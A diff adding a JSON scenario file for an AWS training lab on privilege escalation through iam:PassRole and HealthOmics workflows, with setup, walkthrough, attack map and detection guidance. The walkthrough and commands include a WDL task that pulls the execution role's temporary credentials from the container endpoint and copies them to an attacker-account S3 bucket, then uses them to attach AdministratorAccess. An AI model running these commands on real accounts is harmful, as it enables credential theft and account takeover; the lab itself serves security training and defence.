@@ -1,0 +1,237 @@
+{
+  "displayName": "AWS HealthOmics Workflow to Admin",
+  "name": "omics-001-iam-passrole+omics-createworkflow+omics-startrun",
+  "description": "Pass an admin role to an AWS HealthOmics WDL workflow whose task exfiltrates the execution role's temporary credentials to S3, then retrieve and use those credentials to attach AdministratorAccess to the starting user",
+  "costEstimate": "$0/mo",
+  "pathfindingCloudId": "omics-001",
+  "interactiveDemo": false,
+  "supportsOnlineMode": false,
+  "category": "Privilege Escalation",
+  "subCategory": "new-passrole",
+  "pathType": "one-hop",
+  "target": "to-admin",
+  "environments": [
+    "prod"
+  ],
+  "attackPath": {
+    "principals": [],
+    "summary": ""
+  },
+  "mitreAttack": {
+    "tactics": [
+      "TA0004 - Privilege Escalation",
+      "TA0002 - Execution"
+    ],
+    "techniques": [
+      "T1078.004 - Valid Accounts: Cloud Accounts",
+      "T1578 - Modify Cloud Compute Infrastructure"
+    ]
+  },
+  "terraform": {
+    "variableName": "enable_single_account_privesc_one_hop_to_admin_omics_001_iam_passrole_omics_createworkflow_omics_startrun",
+    "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/omics-001-iam-passrole+omics-createworkflow+omics-startrun"
+  },
+  "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/omics-001-iam-passrole+omics-createworkflow+omics-startrun",
+  "schemaVersion": "4.6.1",
+  "permissions": {
+    "principals": [
+      {
+        "name": "pl-prod-omics-001-to-admin-starting-user",
+        "required": [
+          {
+            "permission": "iam:PassRole",
+            "resource": "arn:aws:iam::*:role/pl-prod-omics-001-to-admin-admin-role",
+            "description": "allows passing the admin role to HealthOmics as the workflow execution role ARN when calling `omics:StartRun`"
+          },
+          {
+            "permission": "omics:CreateWorkflow",
+            "resource": "*",
+            "description": "allows creating the malicious WDL workflow definition that will run as the admin role"
+          },
+          {
+            "permission": "omics:StartRun",
+            "resource": "*",
+            "description": "allows launching the workflow run; `requestParameters.roleArn` in CloudTrail carries the passed admin role ARN"
+          }
+        ],
+        "helpful": [
+          {
+            "permission": "s3:GetObject",
+            "purpose": "retrieve the exfiltrated admin credentials from the attacker-controlled S3 bucket after the workflow completes"
+          },
+          {
+            "permission": "omics:GetWorkflow",
+            "purpose": "poll workflow status to confirm it reached `ACTIVE` before starting the run"
+          },
+          {
+            "permission": "omics:GetRun",
+            "purpose": "poll run status to confirm it reached `COMPLETED` before retrieving credentials"
+          },
+          {
+            "permission": "omics:ListRuns",
+            "purpose": "enumerate existing workflow runs to discover the run ID"
+          },
+          {
+            "permission": "iam:ListAttachedUserPolicies",
+            "purpose": "verify privilege escalation succeeded by listing policies attached to the starting user"
+          }
+        ]
+      }
+    ]
+  },
+  "readme": {
+    "objective": "Your objective is to learn how to exploit a privilege escalation vulnerability that allows you to move from the `pl-prod-omics-001-to-admin-starting-user` IAM user to the `pl-prod-omics-001-to-admin-admin-role` administrative role by creating an AWS HealthOmics WDL workflow that runs with the admin role as its execution role, exfiltrates that role's temporary credentials to an S3 bucket, and uses those stolen credentials to attach `AdministratorAccess` to the starting user.\n\n- **Start:** `arn:aws:iam::{account_id}:user/pl-prod-omics-001-to-admin-starting-user`\n- **Destination resource:** `arn:aws:iam::{account_id}:role/pl-prod-omics-001-to-admin-admin-role`",
+    "setup": {
+      "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew install pathfinding-labs/tap/plabs\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
+      "deployNonInteractive": "```bash\nplabs enable omics-001-to-admin\nplabs apply\n```",
+      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to `omics-001-to-admin` in the scenarios list\n3. Press `space` to enable it\n4. Press `a` to apply"
+    },
+    "attack": {
+      "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::{account_id}:user/pl-prod-omics-001-to-admin-starting-user` | Scenario-specific starting user with access keys; has `iam:PassRole`, `omics:CreateWorkflow`, and `omics:StartRun` |\n| `arn:aws:iam::{account_id}:role/pl-prod-omics-001-to-admin-admin-role` | Administrative role (trusts `omics.amazonaws.com`) passed as `roleArn` to the HealthOmics workflow run |\n| `arn:aws:s3:::pl-prod-omics-001-to-admin-output-{attacker_account_id}-{suffix}` | Attacker-account S3 bucket (created via `aws.attacker` provider); HealthOmics output location and credential exfiltration channel |\n| `arn:aws:ecr:{region}:{attacker_account_id}:repository/pl-prod-omics-001-to-admin-aws-cli` | Private ECR repository (in attacker account) holding the `aws-cli` image required by HealthOmics (cannot pull from public registries); seeded by `demo_attack.sh` on first run using Docker |\n| `arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/omics-001-to-admin` | CTF flag stored in SSM Parameter Store; readable by any admin-equivalent principal |",
+      "demoAttack": {
+        "executing": "The script will:\n1. Retrieve scenario configuration (admin role ARN, attacker bucket name, ECR image URI) from Terraform outputs\n2. Ensure the `aws-cli` container image is available in the private ECR repository (triggers CodeBuild seed on first run, approximately 2-3 minutes)\n3. Create a malicious WDL workflow definition that extracts the execution role's temporary credentials from the container credential provider and writes them to the attacker S3 bucket\n4. Start a HealthOmics workflow run, passing the admin role as the execution role via `iam:PassRole`\n5. Poll until the workflow run reaches `COMPLETED` status (approximately 4-10 minutes)\n6. Retrieve the exfiltrated admin role credentials from the S3 bucket\n7. Use the stolen credentials to attach `AdministratorAccess` to the starting user\n8. Verify successful privilege escalation\n9. Capture the CTF flag from SSM Parameter Store using the newly gained admin permissions\n\nFor deployments using the `aws.attacker` provider (cross-account S3 bucket), the alternate script `demo_attack_cross_account.sh` handles the additional cross-account credential wiring. Use `cleanup_attack_cross_account.sh` to clean up after that variant.",
+        "resourcesCreated": "- HealthOmics workflow definition (deleted by cleanup script)\n- HealthOmics workflow run (deleted by cleanup script)\n- Exfiltrated credential file at `s3://pl-prod-omics-001-to-admin-output-{attacker_account_id}-{suffix}/exfil/creds.json` (deleted by cleanup script)\n- `AdministratorAccess` managed policy attached to `pl-prod-omics-001-to-admin-starting-user` (detached by cleanup script)",
+        "nonInteractive": "```bash\nplabs demo --list\nplabs demo omics-001-iam-passrole+omics-createworkflow+omics-startrun\n```",
+        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `r` to run the demo script"
+      },
+      "cleanup": {
+        "nonInteractive": "```bash\nplabs cleanup --list\nplabs cleanup omics-001-iam-passrole+omics-createworkflow+omics-startrun\n```",
+        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `c` to run the cleanup script"
+      }
+    },
+    "teardown": {
+      "nonInteractive": "```bash\nplabs disable omics-001-to-admin\nplabs apply\n```",
+      "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `omics-001-to-admin` in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
+    },
+    "defend": {
+      "cspm": {
+        "whatToDetect": "- IAM user with `iam:PassRole` on a role that has `AdministratorAccess` or equivalent permissions, combined with `omics:CreateWorkflow` and `omics:StartRun` \u2014 a complete privilege escalation path through AWS HealthOmics\n- IAM role with `AdministratorAccess` whose trust policy allows `omics.amazonaws.com` to assume it \u2014 this role can be passed to any HealthOmics workflow as the execution role\n- `iam:PassRole` permission scoped to an administrative role without a `iam:PassedToService` condition key restricting which services the role can be passed to",
+        "prevention": "- Restrict `iam:PassRole` using the `iam:PassedToService` condition key; if HealthOmics is not used in the account, deny `\"iam:PassedToService\": \"omics.amazonaws.com\"` entirely via SCP\n- Scope `iam:PassRole` resource ARNs to least-privilege HealthOmics execution roles only; never allow passing roles with `AdministratorAccess` or broad IAM write permissions to compute services\n- Audit all IAM roles with `omics.amazonaws.com` in their trust policy and verify none carry `AdministratorAccess` or permissions allowing IAM mutations\n- Apply permission boundaries to HealthOmics execution roles to cap maximum privileges even when broad managed policies are attached \u2014 network isolation does not compensate for overly permissive role credentials inside workflow tasks\n- Implement SCPs to deny `omics:CreateWorkflow` and `omics:StartRun` in accounts and regions where HealthOmics is not in use\n- Use IAM Access Analyzer to automatically detect privilege escalation paths combining `iam:PassRole` with `omics:CreateWorkflow` and `omics:StartRun`"
+      },
+      "cloudSiem": {
+        "cloudTrailEvents": "- `omics:CreateWorkflow` -- new HealthOmics workflow definition created; high severity when the caller also holds `iam:PassRole` on high-privilege roles; inspect `requestParameters.name` for attacker-chosen workflow names\n- `omics:StartRun` -- HealthOmics workflow run started; inspect `requestParameters.roleArn` \u2014 a privileged or administrative role ARN here is the CloudTrail signal for PassRole abuse via HealthOmics; correlate with a preceding `omics:CreateWorkflow` from the same principal\n- `s3:PutObject` -- credential file written to S3 from within the HealthOmics task context; suspicious when the caller is a HealthOmics execution role identity and the object contains credential-shaped JSON\n- `s3:GetObject` -- attacker retrieving the exfiltrated credential file from the output bucket after workflow completion\n- `iam:AttachUserPolicy` -- `AdministratorAccess` or similar managed policy attached to an IAM user using temporary credentials belonging to a HealthOmics execution role; the caller identity in CloudTrail will be the assumed execution role, not the starting user",
+        "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
+      }
+    },
+    "references": "- [AWS HealthOmics Workflow Documentation](https://docs.aws.amazon.com/omics/latest/dev/workflows.html) -- explains how HealthOmics WDL workflows execute and why the execution role's credentials are injected into task containers\n- [AWS IAM PassRole Documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html) -- explains PassRole mechanics and how to restrict it with `iam:PassedToService`\n- [Rhino Security Labs - AWS IAM Privilege Escalation Methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/) -- comprehensive overview of IAM privilege escalation techniques including PassRole patterns\n- [pathfinding.cloud/paths/omics-001](https://pathfinding.cloud/paths/omics-001) -- documented attack path for this scenario",
+    "solution": "# Guided Walkthrough: Privilege Escalation via iam:PassRole + omics:CreateWorkflow + omics:StartRun\n\nThis scenario demonstrates a privilege escalation vulnerability where a user with `iam:PassRole`, `omics:CreateWorkflow`, and `omics:StartRun` permissions can abuse AWS HealthOmics to execute arbitrary code under an admin role, exfiltrate the role's credentials to S3, and use those credentials to permanently elevate their own privileges.\n\nAWS HealthOmics (formerly Amazon Omics) runs genomic analysis workflows in a fully managed, network-isolated environment. Unlike Lambda or ECS, HealthOmics tasks cannot directly call IAM APIs from within the workflow \u2014 they only have outbound access to S3, ECR, and KMS endpoints. This means privilege escalation requires a two-stage approach: exfiltrate the execution role's credentials to S3 from inside the workflow, then retrieve and use those credentials from outside HealthOmics to perform the actual IAM escalation.\n\n## The Challenge\n\nYou start as `pl-prod-omics-001-to-admin-starting-user` \u2014 an IAM user with `iam:PassRole` on a specific admin role, plus `omics:CreateWorkflow` and `omics:StartRun`. Your goal is to reach effective administrator access.\n\nThe environment also contains an IAM role `pl-prod-omics-001-to-admin-admin-role` with `AdministratorAccess` attached that trusts `omics.amazonaws.com`. There is also a private ECR repository containing the `aws-cli` image (required because HealthOmics cannot pull from public registries).\n\n## Reconnaissance\n\nConfirm your identity and verify that you don't have admin access yet:\n\n```bash\naws sts get-caller-identity --query 'Arn' --output text\n# arn:aws:iam::{account_id}:user/pl-prod-omics-001-to-admin-starting-user\n\naws iam list-users --max-items 1\n# AccessDenied \u2014 expected, you're not admin yet\n```\n\nGet your account ID and the required resource identifiers from Terraform outputs:\n\n```bash\ncd <project-root>\nterraform output -json | jq -r '.single_account_privesc_one_hop_to_admin_omics_001_iam_passrole_omics_createworkflow_omics_startrun.value | {admin_role_arn, attacker_bucket_name, ecr_image_uri}'\n```\n\n## Exploitation\n\n### Step 1: Create the malicious WDL workflow definition\n\nHealthOmics uses WDL (Workflow Description Language) to define workflows. The `command` block in a WDL task overrides the container's entrypoint \u2014 allowing you to run arbitrary shell commands under whatever role you pass as the execution role.\n\nThe key insight: HealthOmics injects credentials for the execution role into each task container via the AWS container credential provider (`AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` environment variable). You can extract these credentials and write them to S3.\n\nCreate the WDL workflow definition:\n\n```bash\nmkdir -p /tmp/omics-workflow\ncat > /tmp/omics-workflow/main.wdl << 'WDLEOF'\nversion 1.0\n\nworkflow ExfilCredentials {\n  input { String s3_bucket; String s3_key }\n  call ExfilTask { input: s3_bucket=s3_bucket, s3_key=s3_key }\n}\n\ntask ExfilTask {\n  input { String s3_bucket; String s3_key }\n  command <<<\n    CRED=$(curl -s \"http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\")\n    echo \"$CRED\" | python3 -c \"\nimport sys, json\nd = json.load(sys.stdin)\nprint(json.dumps({'AccessKeyId': d['AccessKeyId'], 'SecretAccessKey': d['SecretAccessKey'], 'SessionToken': d['Token']}))\n\" > /tmp/creds.json\n    aws s3 cp /tmp/creds.json \"s3://~{s3_bucket}/~{s3_key}\"\n  >>>\n  runtime {\n    docker: \"{ecr_image_uri}\"  # replace with actual ECR image URI from Terraform output\n    memory: \"2 GiB\"\n    cpu: 1\n  }\n  output { String result = \"done\" }\n}\nWDLEOF\ncd /tmp/omics-workflow && zip /tmp/omics-workflow.zip main.wdl\n```\n\n### Step 2: Create the HealthOmics workflow\n\n```bash\nWORKFLOW_RESULT=$(aws omics create-workflow \\\n    --name pl-omics-001-privesc \\\n    --definition-zip fileb:///tmp/omics-workflow.zip \\\n    --engine WDL \\\n    --parameter-template '{\"s3_bucket\":{\"description\":\"exfil bucket\"},\"s3_key\":{\"description\":\"exfil key\"}}' \\\n    --output json)\n\nWORKFLOW_ID=$(echo \"$WORKFLOW_RESULT\" | jq -r '.id')\necho \"Workflow ID: $WORKFLOW_ID\"\n```\n\nWait for the workflow to reach `ACTIVE` state (typically 1-3 minutes):\n\n```bash\naws omics get-workflow --id \"$WORKFLOW_ID\" --query 'status' --output text\n# CREATING ... ACTIVE\n```\n\n### Step 3: Start the workflow run with the admin role\n\nPass the admin role as the execution role via `iam:PassRole`:\n\n```bash\nADMIN_ROLE_ARN=\"arn:aws:iam::{account_id}:role/pl-prod-omics-001-to-admin-admin-role\"\nS3_BUCKET=\"{attacker_bucket_name}\"  # from Terraform output\n\nRUN_RESULT=$(aws omics start-run \\\n    --workflow-id \"$WORKFLOW_ID\" \\\n    --role-arn \"$ADMIN_ROLE_ARN\" \\\n    --output-uri \"s3://$S3_BUCKET/output/\" \\\n    --parameters \"{\\\"s3_bucket\\\":\\\"$S3_BUCKET\\\",\\\"s3_key\\\":\\\"exfil/creds.json\\\"}\" \\\n    --output json)\n\nRUN_ID=$(echo \"$RUN_RESULT\" | jq -r '.id')\necho \"Run ID: $RUN_ID\"\n```\n\n### Step 4: Wait for run completion and retrieve credentials\n\nHealthOmics workflow runs typically take 4-10 minutes. Poll for completion:\n\n```bash\naws omics get-run --id \"$RUN_ID\" --query 'status' --output text\n# PENDING -> STARTING -> RUNNING -> COMPLETED\n```\n\nOnce `COMPLETED`, retrieve the exfiltrated credentials from S3:\n\n```bash\naws s3 cp \"s3://$S3_BUCKET/exfil/creds.json\" /tmp/stolen_creds.json\n\nSTOLEN_ACCESS_KEY=$(jq -r '.AccessKeyId' /tmp/stolen_creds.json)\nSTOLEN_SECRET_KEY=$(jq -r '.SecretAccessKey' /tmp/stolen_creds.json)\nSTOLEN_SESSION_TOKEN=$(jq -r '.SessionToken' /tmp/stolen_creds.json)\n```\n\n### Step 5: Use the stolen admin credentials to escalate privileges\n\nConfigure the AWS CLI with the stolen admin role credentials and attach `AdministratorAccess` to yourself:\n\n```bash\nexport AWS_ACCESS_KEY_ID=\"$STOLEN_ACCESS_KEY\"\nexport AWS_SECRET_ACCESS_KEY=\"$STOLEN_SECRET_KEY\"\nexport AWS_SESSION_TOKEN=\"$STOLEN_SESSION_TOKEN\"\n\naws iam attach-user-policy \\\n    --user-name pl-prod-omics-001-to-admin-starting-user \\\n    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n```\n\n## Verification\n\nRestore your starting user credentials, wait 15 seconds for IAM propagation, then verify:\n\n```bash\nexport AWS_ACCESS_KEY_ID=\"{starting_user_access_key}\"\nexport AWS_SECRET_ACCESS_KEY=\"{starting_user_secret_key}\"\nunset AWS_SESSION_TOKEN\n\naws iam list-attached-user-policies \\\n    --user-name pl-prod-omics-001-to-admin-starting-user \\\n    --query 'AttachedPolicies[*].PolicyArn' --output text\n# arn:aws:iam::aws:policy/AdministratorAccess\n\naws iam list-users --max-items 3\n# Returns user list \u2014 you now have admin access\n```\n\n## Capture the Flag\n\nAdmin access isn't the finish line \u2014 the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy you just gained provides implicitly.\n\nUsing your starting user credentials (which now hold `AdministratorAccess`), read the flag:\n\n```bash\naws ssm get-parameter \\\n    --name /pathfinding-labs/flags/omics-001-to-admin \\\n    --query 'Parameter.Value' \\\n    --output text\n# flag{...}  \u2014 your scenario-specific flag value\n```\n\nThe value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario \u2014 only the scenario ID in the path changes.\n\n## What Happened\n\nThe attack exploited the \"PassRole + Service\" pattern with a twist unique to HealthOmics: network isolation. You took three individually scoped permissions and combined them into a full privilege escalation chain:\n\n1. `omics:CreateWorkflow` let you define what code runs in the HealthOmics environment.\n2. `iam:PassRole` let you specify which role that code runs as \u2014 in this case, the admin role.\n3. `omics:StartRun` triggered execution.\n\nBecause HealthOmics only allows outbound access to S3, ECR, and KMS (not IAM), you couldn't call `iam:AttachUserPolicy` directly from within the workflow. Instead, you used S3 as an exfiltration channel: the WDL task captured the execution role's temporary credentials from the container credential provider and wrote them to S3. You then retrieved those credentials from outside HealthOmics and used them to call IAM APIs directly.\n\nThe critical vulnerability is the combination of overly permissive `iam:PassRole` (allowing the admin role to be passed to HealthOmics) and an admin role that trusts `omics.amazonaws.com`. Any organization running genomic workloads in HealthOmics with this configuration is vulnerable, even though the network isolation appears to be a strong security control. The credentials are always available inside workflow tasks \u2014 the isolation only restricts where those credentials can be used from within the workflow, not what they are.\n"
+  },
+  "attackMap": {
+    "nodes": [
+      {
+        "id": "starting-user",
+        "label": "Starting User",
+        "type": "principal",
+        "subType": "iam-user",
+        "arn": "arn:aws:iam::{account_id}:user/pl-prod-omics-001-to-admin-starting-user",
+        "access": {
+          "type": "assumed-breach-credentials"
+        },
+        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer, compromising a workstation, exploiting a vulnerable workload, or discovering credentials in a public repository or CI/CD pipeline.\nThis IAM user has iam:PassRole on the admin target role, omics:CreateWorkflow, and omics:StartRun permissions. Combined, these allow you to create a HealthOmics WDL workflow that exfiltrates the admin role's temporary credentials to S3. HealthOmics workflow tasks run in a network-isolated environment with access only to S3, ECR, and KMS endpoints \u2014 so the exploit requires a two-stage approach: exfiltrate credentials to S3, then retrieve and use them from outside HealthOmics.\n"
+      },
+      {
+        "id": "healthomics-workflow",
+        "label": "HealthOmics Workflow",
+        "type": "resource",
+        "subType": "healthomics-workflow",
+        "arn": "arn:aws:omics:{region}:{account_id}:workflow/*",
+        "description": "A HealthOmics WDL workflow created by the attacker. The workflow definition contains a task that extracts the execution role's temporary credentials from the container credential provider (injected by HealthOmics at runtime) and writes them to an attacker-accessible S3 bucket. The task uses the aws-cli image from private ECR and uploads a JSON file containing AccessKeyId, SecretAccessKey, and SessionToken to S3.\n"
+      },
+      {
+        "id": "admin-role",
+        "label": "Admin Role",
+        "type": "principal",
+        "subType": "iam-role",
+        "isAdmin": true,
+        "arn": "arn:aws:iam::{account_id}:role/pl-prod-omics-001-to-admin-admin-role",
+        "description": "An IAM role with AdministratorAccess attached that trusts omics.amazonaws.com. When passed as the workflow execution role via omics:StartRun, HealthOmics assumes this role to execute the WDL task. The task captures the role's temporary STS credentials from the container credential provider and writes them to the exfiltration S3 bucket. The attacker then retrieves those credentials and uses them to attach AdministratorAccess to the starting user \u2014 pivoting through this role's permissions to reach permanent admin access.\n"
+      },
+      {
+        "id": "ctf-flag",
+        "label": "CTF Flag",
+        "type": "resource",
+        "subType": "ssm-parameter",
+        "isTarget": true,
+        "arn": "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/omics-001-to-admin",
+        "description": "The CTF flag for this scenario, stored as an SSM parameter in the victim account. Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is granted implicitly by AdministratorAccess). Your goal is to read this parameter using the admin access gained from the previous step.\n"
+      }
+    ],
+    "edges": [
+      {
+        "from": "starting-user",
+        "to": "healthomics-workflow",
+        "label": "omics:CreateWorkflow",
+        "description": "The starting user creates a HealthOmics WDL workflow containing a malicious task. The WDL task definition extracts the execution role's temporary credentials from the container credential provider endpoint and uploads them to an attacker-controlled S3 bucket. The workflow is packaged as a zip file containing a single main.wdl file. HealthOmics requires a private ECR image URI for the container runtime \u2014 the scenario provides one pre-seeded in an ECR repository accessible to HealthOmics.\n",
+        "hints": [
+          "Package your WDL workflow as a zip file and submit it via omics:CreateWorkflow with --engine WDL. The workflow must reference a private ECR image URI \u2014 public ECR is not supported.",
+          "Use the ECR image URI from the Terraform output (ecr_image_uri). The WDL command block should capture credentials from the container credential provider and upload them to S3 using the aws-cli.",
+          "Browse to https://pathfinding.cloud/paths/omics-001 for technique details."
+        ],
+        "commands": [
+          {
+            "description": "Create the malicious WDL workflow definition and package it as a zip",
+            "command": "cat > /tmp/main.wdl << 'WDLEOF' version 1.0 workflow ExfilCredentials {\n  input { String s3_bucket; String s3_key }\n  call ExfilTask { input: s3_bucket=s3_bucket, s3_key=s3_key }\n} task ExfilTask {\n  input { String s3_bucket; String s3_key }\n  command <<< CRED=$(curl -s \"http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\"); echo \"$CRED\" | python3 -c \"import sys,json; d=json.load(sys.stdin); print(json.dumps({'AccessKeyId':d['AccessKeyId'],'SecretAccessKey':d['SecretAccessKey'],'SessionToken':d['Token']}))\" > /tmp/c.json; aws s3 cp /tmp/c.json \"s3://~{s3_bucket}/~{s3_key}\" >>>\n  runtime { docker: \"{ecr_image_uri}\"; memory: \"2 GiB\"; cpu: 1 }\n  output { String result = \"done\" }\n} WDLEOF cd /tmp && zip omics-workflow.zip main.wdl\n"
+          },
+          {
+            "description": "Create the HealthOmics workflow from the packaged WDL definition",
+            "command": "aws omics create-workflow\n  --name pl-omics-001-privesc\n  --definition-zip fileb:///tmp/omics-workflow.zip\n  --engine WDL\n  --parameter-template '{\"s3_bucket\":{\"description\":\"exfil bucket\"},\"s3_key\":{\"description\":\"exfil key\"}}'\n  --output json\n"
+          }
+        ]
+      },
+      {
+        "from": "starting-user",
+        "to": "admin-role",
+        "label": "iam:PassRole + omics:StartRun",
+        "description": "The starting user launches the workflow run, passing the admin role as the execution role. HealthOmics assumes the admin role to execute the WDL task. The task extracts the admin role's temporary credentials and writes them to S3. The attacker then reads the credentials from S3 and uses them locally to attach AdministratorAccess to the starting user \u2014 completing the privilege escalation.\n",
+        "hints": [
+          "Use omics:StartRun, specifying the admin role ARN as --role-arn and your attacker S3 bucket as --output-uri. Pass the exfiltration bucket and key as --parameters.",
+          "Poll omics:GetRun until COMPLETED (~4-10 minutes). Then retrieve the stolen credentials from S3 with s3:GetObject. Use the stolen STS credentials to call iam:AttachUserPolicy and grant yourself AdministratorAccess."
+        ],
+        "commands": [
+          {
+            "description": "Start the workflow run passing the admin role as the execution role",
+            "command": "aws omics start-run\n  --workflow-id {workflow_id}\n  --role-arn arn:aws:iam::{account_id}:role/pl-prod-omics-001-to-admin-admin-role\n  --output-uri s3://{output_bucket}/output/\n  --parameters '{\"s3_bucket\":\"{output_bucket}\",\"s3_key\":\"exfil/creds.json\"}'\n  --output json\n"
+          },
+          {
+            "description": "Poll run status until COMPLETED",
+            "command": "aws omics get-run --id {run_id} --query 'status' --output text"
+          },
+          {
+            "description": "Retrieve the exfiltrated admin credentials from S3",
+            "command": "aws s3 cp s3://{output_bucket}/exfil/creds.json /tmp/stolen_creds.json"
+          },
+          {
+            "description": "Use the stolen credentials to attach AdministratorAccess to the starting user",
+            "command": "AWS_ACCESS_KEY_ID=$(jq -r .AccessKeyId /tmp/stolen_creds.json) AWS_SECRET_ACCESS_KEY=$(jq -r .SecretAccessKey /tmp/stolen_creds.json) AWS_SESSION_TOKEN=$(jq -r .SessionToken /tmp/stolen_creds.json) aws iam attach-user-policy\n  --user-name pl-prod-omics-001-to-admin-starting-user\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n"
+          }
+        ]
+      },
+      {
+        "from": "admin-role",
+        "to": "ctf-flag",
+        "label": "Read CTF flag",
+        "description": "With AdministratorAccess now attached to the starting user (via the stolen admin role credentials used in the previous step), retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants ssm:GetParameter on all parameters in the account, so no additional permissions are needed beyond what you just gained. Switch back to the starting user's original credentials to read the flag \u2014 they now have full admin access.\n",
+        "hints": [
+          "You now hold admin-equivalent credentials via the starting user. The scenario flag is stored in AWS Systems Manager Parameter Store at a predictable path.",
+          "Scenario flags live under /pathfinding-labs/flags/ in SSM Parameter Store \u2014 the suffix is the scenario unique ID.",
+          "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
+        ],
+        "commands": [
+          {
+            "description": "Retrieve the CTF flag from SSM Parameter Store",
+            "command": "aws ssm get-parameter --name /pathfinding-labs/flags/omics-001-to-admin --query 'Parameter.Value' --output text"
+          }
+        ]
+      }
+    ]
+  },
+  "hasAttackMap": true,
+  "principalHopCount": 1,
+  "startAccessType": "assumed-breach-credentials",
+  "services": [
+    "iam",
+    "omics"
+  ],
+  "slug": "omics-001",
+  "hasDemoTranscript": false
+}
